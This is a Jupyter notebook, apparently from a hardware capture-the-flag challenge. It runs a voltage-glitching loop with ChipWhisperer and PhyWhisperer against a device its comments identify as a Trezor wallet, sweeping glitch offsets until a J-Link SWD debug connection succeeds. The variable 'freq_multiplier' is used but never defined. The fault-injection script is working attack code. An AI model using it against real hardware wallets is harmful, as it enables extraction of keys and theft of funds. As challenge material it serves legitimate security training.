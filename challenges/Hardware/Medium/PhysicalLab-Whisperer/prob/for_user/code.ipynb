{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "mighty-alpha",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import time\n",
    "from datetime import datetime\n",
    "import logging\n",
    "import os\n",
    "import subprocess\n",
    "import getopt\n",
    "from collections import namedtuple\n",
    "import numpy as np\n",
    "import chipwhisperer as cw\n",
    "import chipwhisperer.common.results.glitch as glitch\n",
    "from tqdm.notebook import trange\n",
    "from importlib import reload\n",
    "import struct\n",
    "\n",
    "Range = namedtuple(\"Range\", [\"min\", \"max\", \"step\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "developed-speaking",
   "metadata": {},
   "outputs": [],
   "source": [
    "scope = cw.scope()\n",
    "scope.default_setup()\n",
    "\n",
    "print(\"ChipWhisperer SN:\", scope.sn)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "prime-killer",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pylink\n",
    "jlink = pylink.JLink()\n",
    "\n",
    "jlink.open()\n",
    "jlink.set_tif(pylink.enums.JLinkInterfaces.SWD)\n",
    "\n",
    "print(jlink.product_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "higher-estonia",
   "metadata": {},
   "outputs": [],
   "source": [
    "# PhyWhisperer-USB configuration (used for USB power control of Trezor)\n",
    "import phywhisperer.usb as pw\n",
    "phy = pw.Usb()\n",
    "phy.con()\n",
    "\n",
    "phy.set_usb_mode(\"auto\")\n",
    "phy.set_power_source(\"off\")\n",
    "time.sleep(0.5)\n",
    "phy.set_power_source(\"5V\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "organic-soldier",
   "metadata": {},
   "outputs": [],
   "source": [
    "def reboot_flush_phase1():\n",
    "    phy.set_power_source(\"off\")\n",
    "    time.sleep(0.2)\n",
    "    scope.arm()\n",
    "    phy.set_power_source(\"5V\")\n",
    "    scope.io.nrst = \"low\"\n",
    "    time.sleep(0.1)\n",
    "    scope.io.nrst = \"high_z\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "detailed-marketing",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "print(datetime.now())\n",
    "\n",
    "repeat_range = Range(12 * freq_multiplier, 14 * freq_multiplier, 1)\n",
    "offset_range = Range(3600 * freq_multiplier, 4800 * freq_multiplier, 1)\n",
    "\n",
    "scope.glitch.repeat = repeat_range.min\n",
    "\n",
    "done = False\n",
    "while done == False:\n",
    "    scope.glitch.ext_offset = offset_range.min\n",
    "    if scope.glitch.repeat >= repeat_range.max:\n",
    "        scope.glitch.repeat = repeat_range.min\n",
    "    while scope.glitch.ext_offset <= offset_range.max:\n",
    "        reboot_flush_phase1()\n",
    "\n",
    "        r = None\n",
    "        try:\n",
    "            r = jlink.connect('target')\n",
    "\n",
    "        except Exception as message:\n",
    "            message = str(message)\n",
    "            if \"Unspecified error\" not in message:\n",
    "                print(message)\n",
    "            pass\n",
    "\n",
    "        else:\n",
    "            print(datetime.now())\n",
    "            os.system('say \"Hack the planet\"')\n",
    "            done = True\n",
    "            break\n",
    "           \n",
    "        scope.glitch.ext_offset += offset_range.step\n",
    "\n",
    "    scope.glitch.repeat += repeat_range.step"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "latter-allowance",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Clean up\n",
    "scope.dis()\n",
    "phy.close()\n",
    "print(\"Done!\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
